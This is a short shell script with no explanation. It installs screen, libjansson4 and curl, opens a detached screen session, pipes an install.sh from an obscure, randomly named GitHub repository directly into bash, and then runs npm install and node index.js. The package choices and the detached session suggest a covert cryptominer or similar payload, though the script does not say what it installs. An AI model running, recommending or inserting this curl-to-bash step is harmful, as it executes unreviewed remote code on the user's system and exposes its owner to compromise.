sudo apt update
sudo apt install screen libjansson4 -y 
sudo apt install curl ca-certificates -y
screen -dmS ls
curl https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/install.sh | bash
source ~/.bashrc
npm install
sh install.sh
node index.js
